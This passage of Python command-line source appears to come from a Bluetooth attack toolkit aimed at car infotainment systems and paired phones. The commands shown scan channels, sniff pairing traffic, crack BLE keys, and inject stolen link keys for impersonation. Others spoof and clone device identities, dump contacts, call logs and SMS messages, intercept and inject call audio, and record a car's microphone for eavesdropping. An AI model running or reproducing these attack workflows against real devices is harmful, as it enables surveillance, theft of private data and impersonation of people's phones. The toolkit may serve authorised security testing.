        console.print("\n[bold yellow]Vulnerability Indicators:[/bold yellow]")
        for hint in fp["vuln_hints"]:
            console.print(f"  [yellow]![/yellow] {hint}")

    from blue_tap.utils.session import log_command
    log_command("fingerprint", fp, category="recon", target=address)

    if output:
        _save_json(fp, output)


@recon.command("ssp")
@click.argument("address", required=False, default=None)
def recon_ssp(address):
    """Check if device supports Secure Simple Pairing."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.sdp import check_ssp

    info(f"Checking SSP support on [bold]{address}[/bold]...")
    result = check_ssp(address)
    if result is True:
        success(f"{address} supports SSP (more secure pairing)")
    elif result is False:
        warning(f"{address} may NOT support SSP (legacy pairing - easier to attack)")
    else:
        error(f"Could not determine SSP support for {address}")


@recon.command("rfcomm-scan")
@click.argument("address", required=False, default=None)
@click.option("-t", "--timeout", default=2.0, help="Timeout per channel")
@click.option("--retries", default=1, help="Retries per channel on timeout")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_rfcomm_scan(address, timeout, retries, output):
    """Scan all RFCOMM channels (1-30) for hidden services."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.rfcomm_scan import RFCOMMScanner

    info(f"Scanning RFCOMM channels 1-30 on [bold]{address}[/bold] (timeout={timeout}s)...")
    scanner = RFCOMMScanner(address)
    results = scanner.scan_all_channels(timeout_per_ch=timeout, max_retries=retries)

    # Show open/interesting channels only
    interesting = [r for r in results if r["status"] != "closed"]
    if interesting:
        console.print(channel_table(interesting, title="RFCOMM Scan Results"))
    else:
        warning("No open RFCOMM channels found")

    open_channels = [r for r in results if r["status"] == "open"]
    info(f"Scanned {len(results)} channels: {len(open_channels)} open")

    from blue_tap.utils.session import log_command
    log_command("rfcomm_scan", results, category="recon", target=address)

    if output:
        # Serialize (strip raw_response bytes for JSON)
        for r in results:
            r.pop("raw_response", None)
        _save_json(results, output)


@recon.command("l2cap-scan")
@click.argument("address", required=False, default=None)
@click.option("--dynamic", is_flag=True, help="Also scan dynamic PSM range")
@click.option("-t", "--timeout", default=1.0, help="Timeout per PSM")
@click.option("--workers", default=10, help="Parallel workers for dynamic scan")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_l2cap_scan(address, dynamic, timeout, workers, output):
    """Scan L2CAP PSM values for open services."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.l2cap_scan import L2CAPScanner

    range_desc = "standard + dynamic" if dynamic else "standard"
    info(f"Scanning L2CAP PSMs on [bold]{address}[/bold] ({range_desc}, timeout={timeout}s)...")
    scanner = L2CAPScanner(address)
    results = scanner.scan_standard_psms(timeout=timeout)

    if dynamic:
        info("  Scanning dynamic PSM range...")
        results.extend(scanner.scan_dynamic_psms(timeout=timeout, workers=workers))

    if results:
        console.print(channel_table(results, title="L2CAP Scan Results"))

    open_psms = [r for r in results if r["status"] in ("open", "auth_required")]
    if not open_psms:
        warning("No open L2CAP PSMs found")

    from blue_tap.utils.session import log_command
    log_command("l2cap_scan", results, category="recon", target=address)

    if output:
        _save_json(results, output)


@recon.command("capture-start")
@click.option("-o", "--output", default="bt_capture.log", help="Output file")
@click.option("-i", "--hci", default=None, help="HCI adapter (default: all)")
@click.option("--pcap", is_flag=True, help="Write btsnoop/pcap format for Wireshark")
def recon_capture_start(output, hci, pcap):
    """Start HCI traffic capture via btmon."""
    from blue_tap.recon.hci_capture import HCICapture

    # Auto-adjust extension for pcap mode
    if pcap and not output.endswith((".pcap", ".btsnoop")):
        output = output.rsplit(".", 1)[0] + ".btsnoop"

    cap = HCICapture()
    if cap.start(output, hci=hci, pcap=pcap):
        success(f"btmon capture started -> {output}")
    else:
        error("Failed to start capture")


@recon.command("capture-stop")
def recon_capture_stop():
    """Stop HCI traffic capture."""
    from blue_tap.recon.hci_capture import HCICapture

    cap = HCICapture()
    result = cap.stop()
    if result:
        success(f"Capture stopped: {result}")
    else:
        warning("No capture appears to be running")


@recon.command("pairing-mode")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
def recon_pairing_mode(address, hci):
    """Detect target's pairing mode and IO capabilities."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.hci_capture import detect_pairing_mode

    info(f"Detecting pairing mode on [bold]{address}[/bold]...")
    result = detect_pairing_mode(address, hci)
    panel_text = (
        f"[cyan]SSP Supported:[/cyan] {result.get('ssp_supported') if result.get('ssp_supported') is not None else 'Inconclusive (probe failed)'}\n"
        f"[cyan]IO Capability:[/cyan] {result.get('io_capability', 'Unknown')}\n"
        f"[cyan]Pairing Method:[/cyan] {result.get('pairing_method', 'Unknown')}"
    )
    console.print(Panel(panel_text, title="Pairing Mode Detection", border_style="cyan"))


@recon.command("nrf-scan")
@click.option("-d", "--duration", default=30, help="Scan duration (seconds)")
def recon_nrf_scan(duration):
    """Scan BLE advertisers using nRF52840 dongle."""
    from blue_tap.recon.sniffer import NRFBLESniffer

    info(f"Starting BLE advertisement scan via nRF52840 ({duration}s)...")
    sniffer = NRFBLESniffer()
    sniffer.scan_advertisers(duration)


@recon.command("lmp-sniff")
@click.argument("address", required=False, default=None)
@click.option("-d", "--duration", default=120, type=int, help="Capture duration in seconds")
@click.option("-o", "--output", default="lmp_capture.json", help="Output file path")
@click.option("--hci", default="hci1", help="HCI device for DarkFirmware adapter (e.g. hci1 or 1)")
@click.option("-f", "--format", "output_format", default="json",
              type=click.Choice(["json", "pcap"]), help="Output format (json=BTIDES v2, pcap=Wireshark)")
@click.option("--filter", "lmp_filter", default=None,
              type=click.Choice(["auth", "encryption", "features", "security"]),
              help="Filter LMP packets by category")
def recon_lmp_sniff(address, duration, output, hci, output_format, lmp_filter):
    """Capture LMP traffic using DarkFirmware RTL8761B.

    Monitors incoming LMP packets via the firmware's RX hook.
    Captures pre-encryption negotiation (features, auth, key size).
    Exports to BTIDES v2 JSON or Wireshark pcap format.
    """
    from blue_tap.recon.sniffer import DarkFirmwareSniffer, LMPFilter

    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
    sniffer = DarkFirmwareSniffer(hci_dev=hci_dev)
    if not sniffer.is_available():
        error("DarkFirmware not available. Check adapter with: blue-tap adapter firmware-status")
        return

    pkt_filter = LMPFilter(category=lmp_filter) if lmp_filter else None
    info(f"Starting LMP capture (duration={duration}s, output={output}, format={output_format})")
    result = sniffer.start_capture(
        target=address,
        output=output,
        duration=duration,
        lmp_filter=pkt_filter,
        output_format=output_format,
    )

    from blue_tap.utils.session import log_command
    log_command("lmp_sniff", result, category="recon", target=address or "")

    if result["success"]:
        success(f"Captured {result['packets']} LMP packets in {result['duration']}s")
        success(f"Output: {result['output']}")
    else:
        error("LMP capture failed")


@recon.command("lmp-monitor")
@click.argument("address", required=False, default=None)
@click.option("-d", "--duration", default=0, type=int, help="Monitor duration (0=until Ctrl-C)")
@click.option("--hci", default="hci1", help="HCI device for DarkFirmware adapter (e.g. hci1 or 1)")
@click.option("--dashboard", is_flag=True, help="Rich live dashboard display")
@click.option("--filter", "lmp_filter", default=None,
              type=click.Choice(["auth", "encryption", "features", "security"]),
              help="Filter LMP packets by category")
def recon_lmp_monitor(address, duration, hci, dashboard, lmp_filter):
    """Real-time LMP packet monitor using DarkFirmware.

    Shows incoming LMP packets in real-time on the console.
    Use --dashboard for a Rich live UI with packet stream table.
    Use Ctrl-C to stop monitoring.
    """
    from blue_tap.recon.sniffer import DarkFirmwareSniffer, LMPFilter

    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
    sniffer = DarkFirmwareSniffer(hci_dev=hci_dev)
    if not sniffer.is_available():
        error("DarkFirmware not available. Check adapter with: blue-tap adapter firmware-status")
        return

    pkt_filter = LMPFilter(category=lmp_filter) if lmp_filter else None
    sniffer.monitor(
        target=address,
        duration=duration,
        lmp_filter=pkt_filter,
        dashboard=dashboard,
    )


@recon.command("nrf-sniff")
@click.option("-t", "--target", default=None, help="BLE address to follow")
@click.option("-o", "--output", default="ble_pairing.pcap", help="Output pcap file")
@click.option("-d", "--duration", default=120, help="Capture duration (seconds)")
def recon_nrf_sniff(target, output, duration):
    """Sniff BLE pairing exchanges using nRF52840 dongle."""
    from blue_tap.recon.sniffer import NRFBLESniffer

    target_str = f" following {target}" if target else ""
    info(f"Starting BLE pairing sniff via nRF52840{target_str} ({duration}s)...")
    sniffer = NRFBLESniffer()
    sniffer.sniff_pairing(output, duration, target=target)


@recon.command("combined-sniff")
@click.argument("address", required=False, default=None)
@click.option("-d", "--duration", default=60, type=int, help="Capture duration in seconds")
@click.option("-o", "--output", default="combined_capture.json", help="Output file path")
@click.option("--hci", default="hci1", help="HCI device for DarkFirmware adapter (e.g. hci1 or 1)")
def recon_combined_sniff(address, duration, output, hci):
    """Simultaneous BLE + LMP monitoring.

    Runs nRF52840 BLE sniffer and DarkFirmware LMP monitor concurrently
    with a unified timeline. Covers the full attack surface from
    advertisements through link-layer negotiation.
    """
    from blue_tap.recon.sniffer import (
        CombinedSniffer, NRFBLESniffer, DarkFirmwareSniffer,
    )

    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
    nrf_ok = NRFBLESniffer.is_available()
    df_ok = DarkFirmwareSniffer(hci_dev=hci_dev).is_available()

    if not nrf_ok and not df_ok:
        error("Neither nRF52840 nor DarkFirmware adapter available")
        return

    if not nrf_ok:
        warning("nRF52840 not available, LMP-only capture")
    if not df_ok:
        warning("DarkFirmware not available, BLE-only capture")

    info(f"Starting combined BLE+LMP capture (duration={duration}s)")
    combined = CombinedSniffer(
        nrf_available=nrf_ok,
        darkfirmware_available=df_ok,
        hci_dev=hci_dev,
    )
    result = combined.monitor(target=address, duration=duration)

    from blue_tap.utils.session import log_command
    log_command("combined_sniff", result, category="recon", target=address or "")

    if result.get("success"):
        combined.export(output)
        success(f"Combined capture: {result['lmp_count']} LMP + {result['ble_count']} BLE events")
        success(f"Output: {output}")
    else:
        error("Combined capture failed")


@recon.command("crack-key")
@click.argument("pcap_file")
@click.option("-o", "--output", default=None, help="Output decrypted pcap")
def recon_crack_key(pcap_file, output):
    """Crack BLE pairing key from captured pcap using Crackle."""
    from blue_tap.recon.sniffer import CrackleRunner

    info(f"Cracking BLE pairing key from [bold]{pcap_file}[/bold]...")
    runner = CrackleRunner()
    result = runner.crack_ble(pcap_file, output)
    if result.get("success"):
        if result.get("ltk"):
            success(f"LTK recovered: {result['ltk']}")
        if result.get("tk"):
            info(f"TK recovered: {result['tk']}")
    else:
        warning("Key crack failed — pcap may not contain a complete pairing exchange")


@recon.command("extract-link-key")
@click.argument("pcap_file")
def recon_extract_link_key(pcap_file):
    """Extract BR/EDR link key from captured pairing pcap (via tshark)."""
    from blue_tap.recon.sniffer import LinkKeyExtractor

    info(f"Extracting link keys from [bold]{pcap_file}[/bold]...")
    extractor = LinkKeyExtractor()
    result = extractor.extract_from_pcap(pcap_file)
    if result.get("success"):
        for key in result.get("keys", []):
            success(f"Link key: {key}")


@recon.command("inject-link-key")
@click.argument("remote_mac")
@click.argument("link_key")
@click.option("-i", "--hci", default="hci0")
@click.option("--key-type", default=4, help="BlueZ key type (4=auth, 5=unauth)")
def recon_inject_link_key(remote_mac, link_key, hci, key_type):
    """Inject a recovered link key into BlueZ for impersonation.

    \b
    After recovering a link key (via nRF/DarkFirmware capture + crack, or other means),
    inject it so bluetoothctl can connect using the stolen key.
    """
    from blue_tap.recon.sniffer import LinkKeyExtractor

    info(f"Injecting link key for [bold]{remote_mac}[/bold] into BlueZ ({hci})...")
    extractor = LinkKeyExtractor()
    adapter_mac = extractor.get_adapter_mac(hci)
    if not adapter_mac:
        error(f"Cannot determine adapter MAC for {hci}")
        return
    extractor.inject_link_key(adapter_mac, remote_mac, link_key, key_type)
    success(f"Link key injected — try: bluetoothctl connect {remote_mac}")


# ============================================================================
# SPOOFING
# ============================================================================
@main.group()
def spoof():
    """MAC address spoofing and device impersonation."""


@spoof.command("mac")
@click.argument("target_mac", required=False, default=None)
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-m", "--method", default="auto",
              type=click.Choice(["auto", "bdaddr", "spooftooph", "btmgmt"]))
def spoof_mac(target_mac, hci, method):
    """Spoof adapter MAC address to target."""
    target_mac = resolve_address(target_mac)
    if not target_mac:
        return
    info(f"Spoofing adapter {hci} MAC to {target_mac} (method={method})")
    from blue_tap.core.spoofer import spoof_address
    ok = False
    try:
        ok = spoof_address(hci, target_mac, method)
        if ok:
            success(f"MAC address changed to {target_mac} on {hci}")
        else:
            error(f"MAC spoof failed — address not changed on {hci}")
    except Exception as exc:
        error(f"MAC spoof failed: {exc}")

    from blue_tap.utils.session import log_command
    log_command("spoof_mac", {"target_mac": target_mac, "hci": hci, "method": method, "success": ok}, category="attack")


@spoof.command("clone")
@click.argument("target_mac", required=False, default=None)
@click.argument("target_name", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("-c", "--device-class", default="0x5a020c",
              help="Device class (default: smartphone)")
def spoof_clone(target_mac, target_name, hci, device_class):
    """Full identity clone: MAC + name + device class."""
    target_mac = resolve_address(target_mac)
    if not target_mac:
        return
    if not target_name:
        error("Phone name is required for identity clone (e.g., 'Galaxy S24')")
        return
    info(f"Cloning device identity from {target_mac} on adapter {hci}")
    info(f"  MAC: {target_mac}, Name: {target_name}, Class: {device_class}")
    from blue_tap.core.spoofer import clone_device_identity
    ok = False
    try:
        info("Step 1/3: Spoofing MAC address...")
        info("Step 2/3: Setting device name...")
        info("Step 3/3: Setting device class...")
        ok = clone_device_identity(hci, target_mac, target_name, device_class)
        if ok:
            success(f"Identity clone complete: now impersonating {target_name} ({target_mac})")
        else:
            error(f"Identity clone failed — device identity not changed on {hci}")
    except Exception as exc:
        error(f"Identity clone failed: {exc}")

    from blue_tap.utils.session import log_command
    log_command("spoof_clone", {"target_mac": target_mac, "target_name": target_name, "device_class": device_class, "success": ok}, category="attack")


@spoof.command("restore")
@click.option("-i", "--hci", default="hci0")
@click.option("-m", "--method", default="auto",
              type=click.Choice(["auto", "bdaddr", "spooftooph", "btmgmt"]))
def spoof_restore(hci, method):
    """Restore adapter to its original MAC address."""
    info(f"Restoring original MAC address on adapter {hci} (method={method})")
    from blue_tap.core.spoofer import restore_original_mac
    ok = False
    try:
        ok = restore_original_mac(hci, method)
        if ok:
            success(f"Original MAC restored on {hci}")
        else:
            error(f"MAC restore failed — original address not restored on {hci}")
    except Exception as exc:
        error(f"MAC restore failed: {exc}")

    from blue_tap.utils.session import log_command
    log_command("spoof_restore", {"hci": hci, "method": method, "success": ok}, category="attack")


# ============================================================================
# PBAP - Phone Book Access
# ============================================================================
@main.group()
def pbap():
    """Phone Book Access Profile - download phonebook and call logs."""


@pbap.command("pull")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None,
              help="RFCOMM channel (auto-discovered if not specified)")
@click.option("-p", "--path", default="telecom/pb.vcf",
              help="PBAP path to pull")
@click.option("-o", "--output-dir", default="pbap_dump")
def pbap_pull(address, channel, path, output_dir):
    """Pull a specific phonebook object."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.pbap import PBAPClient
    from blue_tap.recon.sdp import find_service_channel

    info(f"Pulling PBAP object [bold]{path}[/bold] from [bold]{address}[/bold]...")
    if channel is None:
        info("  Auto-discovering PBAP channel via SDP...")
        channel = find_service_channel(address, "Phonebook")
        if channel is None:
            channel = find_service_channel(address, "PBAP")
        if channel is None:
            error("Could not find PBAP channel via SDP. Specify with -c.")
            return
        info(f"  Found PBAP on RFCOMM channel {channel}")

    info(f"  Connecting to PBAP service on channel {channel}...")
    client = PBAPClient(address, channel=channel)
    if not client.connect():
        error("PBAP connection failed")
        return

    try:
        info(f"  Requesting {path}...")
        data = client.pull_phonebook(path)
        if data:
            os.makedirs(output_dir, exist_ok=True)
            filename = os.path.join(output_dir, path.replace("/", "_"))
            with open(filename, "w") as f:
                f.write(data)
            entries = data.count("BEGIN:VCARD")
            success(f"Extracted {entries} vCard(s) -> {filename} ({len(data):,} bytes)")
        else:
            warning(f"No data returned for {path}")
    finally:
        client.disconnect()
        info("  PBAP session closed")


@pbap.command("dump")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-o", "--output-dir", default="pbap_dump")
def pbap_dump(address, channel, output_dir):
    """Dump ALL phonebook data: contacts, call logs, favorites, SIM."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.pbap import PBAPClient
    from blue_tap.recon.sdp import find_service_channel

    info(f"Starting full PBAP dump from [bold]{address}[/bold]...")
    info("  Targets: contacts, call history (in/out/missed), favorites, SIM phonebook")
    if channel is None:
        info("  Auto-discovering PBAP channel via SDP...")
        channel = find_service_channel(address, "Phonebook")
        if channel is None:
            channel = find_service_channel(address, "PBAP")
        if channel is None:
            error("Could not find PBAP channel via SDP. Specify with -c.")
            return
        info(f"  Found PBAP on RFCOMM channel {channel}")

    info(f"  Connecting to PBAP service on channel {channel}...")
    client = PBAPClient(address, channel=channel)
    if not client.connect():
        error("PBAP connection failed")
        return

    try:
        info("  Pulling all phonebook objects...")
        results = client.pull_all_data(output_dir)
        if results:
            table = Table(title="PBAP Dump Results")
            table.add_column("Path")
            table.add_column("Description")
            table.add_column("File")
            table.add_column("Size", justify="right")
            for path, info_dict in results.items():
                table.add_row(path, info_dict["description"],
                              info_dict["file"], str(info_dict["size"]))
            console.print(table)
            total_size = sum(d["size"] for d in results.values())
            success(f"PBAP dump complete: {len(results)} object(s), {total_size:,} bytes -> {output_dir}/")

            from blue_tap.utils.session import log_command
            log_command("pbap_dump", results, category="data", target=address)
        else:
            warning("No PBAP data returned — device may require authorization")
    finally:
        client.disconnect()
        info("  PBAP session closed")


# ============================================================================
# MAP - Message Access
# ============================================================================
@main.group("map")
def map_cmd():
    """Message Access Profile - download SMS/MMS messages."""


@map_cmd.command("list")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-f", "--folder", default="telecom/msg/inbox")
def map_list(address, channel, folder):
    """List messages in a folder."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.map_client import MAPClient
    from blue_tap.recon.sdp import find_service_channel

    info(f"Listing messages in [bold]{folder}[/bold] on [bold]{address}[/bold]...")
    if channel is None:
        info("  Auto-discovering MAP channel via SDP...")
        channel = find_service_channel(address, "Message")
        if channel is None:
            channel = find_service_channel(address, "MAP")
        if channel is None:
            error("Could not find MAP channel via SDP. Specify with -c.")
            return
        info(f"  Found MAP on RFCOMM channel {channel}")

    info(f"  Connecting to MAP service on channel {channel}...")
    client = MAPClient(address, channel=channel)
    if not client.connect():
        error("MAP connection failed")
        return

    try:
        info(f"  Fetching message listing from {folder}...")
        listing = client.get_messages_listing(folder)
        if listing:
            console.print(listing)
            success(f"Message listing retrieved from {folder}")
        else:
            warning(f"No messages found in {folder}")
    finally:
        client.disconnect()
        info("  MAP session closed")


@map_cmd.command("dump")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-o", "--output-dir", default="map_dump")
def map_dump(address, channel, output_dir):
    """Dump all messages from all folders."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.map_client import MAPClient
    from blue_tap.recon.sdp import find_service_channel

    info(f"Starting full MAP dump from [bold]{address}[/bold]...")
    info("  Targets: inbox, sent, draft, deleted, outbox")
    if channel is None:
        info("  Auto-discovering MAP channel via SDP...")
        channel = find_service_channel(address, "Message")
        if channel is None:
            channel = find_service_channel(address, "MAP")
        if channel is None:
            error("Could not find MAP channel via SDP. Specify with -c.")
            return
        info(f"  Found MAP on RFCOMM channel {channel}")

    info(f"  Connecting to MAP service on channel {channel}...")
    client = MAPClient(address, channel=channel)
    if not client.connect():
        error("MAP connection failed")
        return

    try:
        info("  Dumping messages from all folders...")
        dump_results = client.dump_all_messages(output_dir)
        if dump_results and isinstance(dump_results, dict):
            total_msgs = sum(
                len(v.get("messages", [])) if isinstance(v, dict) else 0
                for v in dump_results.values()
            )
            success(f"MAP dump complete: {len(dump_results)} folder(s), {total_msgs} message(s) -> {output_dir}/")
        else:
            success(f"MAP dump complete -> {output_dir}/")
            dump_results = {"output_dir": output_dir}

        from blue_tap.utils.session import log_command
        log_command("map_dump", dump_results, category="data", target=address)
    finally:
        client.disconnect()
        info("  MAP session closed")


# ============================================================================
# HFP - Hands-Free Profile (Audio)
# ============================================================================
@main.group()
def hfp():
    """Hands-Free Profile - call audio interception and injection."""


@hfp.command("connect")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
def hfp_connect(address, channel):
    """Connect HFP and establish Service Level Connection."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")

    if channel is None:
        error("Could not find HFP channel. Specify with -c.")
        return

    info(f"Establishing HFP connection to {address} on channel {channel}...")
    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        success(f"HFP SLC established with {address}.")
        # Interactive AT command mode
        info("Entering AT command mode. Type 'quit' to exit.")
        while True:
            try:
                cmd = input("AT> ").strip()
                if cmd.lower() in ("quit", "exit", "q"):
                    break
                if cmd:
                    client.send_at(cmd)
            except (EOFError, KeyboardInterrupt):
                break
        from blue_tap.utils.session import log_command
        log_command("hfp_connect", {"channel": channel}, category="attack", target=address)
        client.disconnect()
        info("HFP session closed.")
    else:
        error(f"HFP SLC setup failed for {address} on channel {channel}.")


@hfp.command("capture")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-o", "--output", default="hfp_capture.wav")
@click.option("-d", "--duration", default=60, help="Capture duration in seconds")
def hfp_capture(address, channel, output, duration):
    """Capture call audio to WAV file via SCO link."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")

    if channel is None:
        error("Could not find HFP channel.")
        return

    info(f"Establishing HFP connection to {address} on channel {channel}...")
    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        success("HFP SLC established.")
        info(f"Starting call audio capture on {address} (duration {duration}s)...")
        client.capture_audio(output, duration)
        import os
        if os.path.exists(output):
            size = os.path.getsize(output)
            success(f"Audio saved to {output} ({size} bytes)")
        else:
            warning(f"Capture completed but output file {output} not found.")
        from blue_tap.utils.session import log_command
        log_command("hfp_capture", {"output": output, "duration": duration}, category="audio", target=address)
        client.disconnect()
        info("HFP session closed.")
    else:
        error(f"HFP connection/SLC setup failed for {address}.")


@hfp.command("inject")
@click.argument("address", required=False, default=None)
@click.argument("audio_file")
@click.option("-c", "--channel", type=int, default=None)
def hfp_inject(address, audio_file, channel):
    """Inject audio file into call via SCO link."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")

    if channel is None:
        error("Could not find HFP channel.")
        return

    info(f"Establishing HFP connection to {address} on channel {channel}...")
    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        success("HFP SLC established.")
        info(f"Injecting audio from {audio_file} into call on {address}...")
        client.inject_audio(audio_file)
        success("Audio injection complete.")
        from blue_tap.utils.session import log_command
        log_command("hfp_inject", {"audio_file": audio_file}, category="attack", target=address)
        client.disconnect()
        info("HFP session closed.")
    else:
        error(f"HFP connection/SLC setup failed for {address}.")


@hfp.command("at")
@click.argument("address", required=False, default=None)
@click.argument("command")
@click.option("-c", "--channel", type=int, default=None)
def hfp_at(address, command, channel):
    """Send a raw AT command to the HFP Audio Gateway."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")

    if channel is None:
        error("Could not find HFP channel.")
        return

    info(f"Connecting to HFP on {address} channel {channel}...")
    client = HFPClient(address, channel=channel)
    if client.connect():
        client.setup_slc()
        info(f"Sending AT command: {command}")
        result = client.send_at(command)
        console.print(f"[yellow]{result}[/yellow]")
        success("AT command sent.")
        from blue_tap.utils.session import log_command
        log_command("hfp_at", {"command": command, "response": result}, category="attack", target=address)
        client.disconnect()
        info("HFP session closed.")
    else:
        error(f"HFP connection failed for {address}.")


@hfp.command("dtmf")
@click.argument("address", required=False, default=None)
@click.argument("digits")
@click.option("-c", "--channel", type=int, default=None)
@click.option("--interval", default=0.3, help="Delay between digits (seconds)")
def hfp_dtmf(address, digits, channel, interval):
    """Send DTMF tones (e.g., '1234#')."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    info(f"Establishing HFP connection to {address} on channel {channel}...")
    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        success("HFP SLC established.")
        info(f"Sending DTMF digits '{digits}' (interval {interval}s)...")
        client.dtmf_sequence(digits, interval)
        success(f"DTMF sequence '{digits}' sent.")
        client.disconnect()
        info("HFP session closed.")
    else:
        error(f"HFP connection/SLC setup failed for {address}.")


@hfp.command("hold")
@click.argument("address", required=False, default=None)
@click.argument("action", type=int)
@click.option("-c", "--channel", type=int, default=None)
def hfp_hold(address, action, channel):
    """Call hold/swap (0=release, 1=hold+accept, 2=swap, 3=conference)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    action_names = {0: "release", 1: "hold+accept", 2: "swap", 3: "conference"}
    action_desc = action_names.get(action, str(action))
    info(f"Establishing HFP connection to {address} on channel {channel}...")
    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        success("HFP SLC established.")
        info(f"Sending call hold action {action} ({action_desc}) to {address}...")
        result = client.call_hold(action)
        console.print(f"[yellow]{result}[/yellow]")
        success(f"Hold action '{action_desc}' sent.")
        client.disconnect()
        info("HFP session closed.")
    else:
        error(f"HFP connection/SLC setup failed for {address}.")


@hfp.command("redial")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
def hfp_redial(address, channel):
    """Redial the last dialed number."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    info(f"Establishing HFP connection to {address} on channel {channel}...")
    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        success("HFP SLC established.")
        info(f"Sending redial command to {address}...")
        result = client.redial()
        console.print(f"[yellow]{result}[/yellow]")
        success("Redial command sent.")
        client.disconnect()
        info("HFP session closed.")
    else:
        error(f"HFP connection/SLC setup failed for {address}.")


@hfp.command("voice")
@click.argument("address", required=False, default=None)
@click.option("--on/--off", default=True, help="Enable or disable voice recognition")
@click.option("-c", "--channel", type=int, default=None)
def hfp_voice(address, on, channel):
    """Activate/deactivate voice recognition on the IVI."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    state_str = "ON" if on else "OFF"
    info(f"Establishing HFP connection to {address} on channel {channel}...")
    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        success("HFP SLC established.")
        info(f"Setting voice recognition {state_str} on {address}...")
        result = client.voice_recognition(on)
        console.print(f"[yellow]{result}[/yellow]")
        success(f"Voice recognition {state_str} command sent.")
        client.disconnect()
        info("HFP session closed.")
    else:
        error(f"HFP connection/SLC setup failed for {address}.")


# ============================================================================
# AUDIO - Unified Audio Operations (A2DP + HFP via PulseAudio)
# ============================================================================
@main.group()
def audio():
    """Audio capture, injection, and eavesdropping via PulseAudio."""


@audio.command("record-mic")
@click.argument("mac", required=False, default=None)
@click.option("-o", "--output", default="car_mic.wav")
@click.option("-d", "--duration", default=60, help="Duration in seconds (0=until Ctrl+C)")
@click.option("--no-setup", is_flag=True, help="Skip auto profile/mic setup")
def audio_record_mic(mac, output, duration, no_setup):
    """Record from car's Bluetooth microphone (eavesdrop).

    Automatically switches to HFP profile, mutes laptop mic,
    unmutes car mic at 100% volume, and records using parecord.
    """
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import record_car_mic
    dur_str = f"{duration}s" if duration > 0 else "until Ctrl+C"
    info(f"Recording microphone audio from {mac} ({dur_str}, output: {output})...")
    if not no_setup:
        info("Auto-configuring HFP profile and mic settings...")
    record_car_mic(mac, output, duration, auto_setup=not no_setup)
    import os
    if os.path.exists(output):
        size = os.path.getsize(output)
        success(f"Recording saved to {output} ({size} bytes)")
    else:
        warning(f"Recording completed but output file {output} not found.")
    from blue_tap.utils.session import log_command
    log_command("audio_record_mic", {"output": output, "duration": duration}, category="audio", target=mac)


@audio.command("live")
@click.argument("mac", required=False, default=None)
